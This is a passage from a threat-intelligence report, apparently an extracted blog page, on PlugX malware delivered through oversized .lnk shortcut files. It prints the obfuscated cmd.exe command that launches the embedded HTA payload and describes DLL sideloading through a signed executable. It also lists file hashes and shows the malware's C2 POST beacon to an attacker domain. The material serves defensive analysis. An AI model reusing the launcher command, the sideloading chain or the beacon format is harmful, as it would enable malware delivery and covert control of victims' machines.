@@ -1,0 +1,49 @@
+PlugX Payload Analysis
+“.lnk” files that used PlugX as the payload were abnormally big in size. In general, the “.lnk” files
+are less than 10Kb, but the malicious samples in the campaign were more than 700Kb. Upon
+taking a closer look we found that the “.lnk” files were embedded with 3 base64 encoded
+executables.
+Upon opening the LNK file, it will then proceed to execute the below command via cmd.exe.
+command: /c for %x in (%temp%=%cd%) do for /f "delims==" %i in ('dir "%x\tieu luan ve quyen
+lam chu cua nhan dan.docx.lnk" /s /b') do start m%windir:~-1,1%hta .exe "%i"
+https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations 15/21
+10/8/2019 China-Based APT Mustang Panda Targets Minority Groups, Public and Private Sector Organizations | Anomali
+The command executes the HTA file embedded inside the shortcut and it decodes and drops 3
+executables in the “%TEMP%” directory and opens a decoy word document to the user.
+Figure 16 – Extracted binaries and Decoy document
+All three dropped files were then moved to a new folder “C:\ProgramData\Microsoft Malware
+ProtectionGHQ”
+Figure 17 – Binaries moved to different path
+The “3.exe” is a legitimate executable and it is signed by “ESET, spol. s r.o.” and it is being
+abused for DLL hijacking technique to execute http_dll.dll which decodes and loads the malicious
+payload http_dll.dat.
+Table 2 – PlugX Hashes
+File Name Hash
+3.exe (original name: EHttpSrv.exe) 28C6F235946FD694D2634C7A2F24C1BA
+http_dll.dll 9912EB641EABD640A476720C51F5E3AD
+http_dll.dat 2BC7298A57AE2B8AB5B4A7B53360EB5C
+After the payload execution it reaches out to the C2 via POST request as shown below.
+https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations 16/21
+10/8/2019 China-Based APT Mustang Panda Targets Minority Groups, Public and Private Sector Organizations | Anomali
+```
+    POST /update?wd=4337295e HTTP/1.1
+Accept: */*
+x-debug: 0
+
+x-request: 0
+
+x-content: 61456
+
+x-storage: 1
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1;
+
+Host: aridndvn.ccom:443
+
+Content-Length: 0
+Proxy-Connection: Keep-Alive
+Pragma: no-cache
+
+```
+If the C2 is not available the payload tries to reach different embedded C2 domains on unique
+ports.
+Figure 18 – Network connections to C2
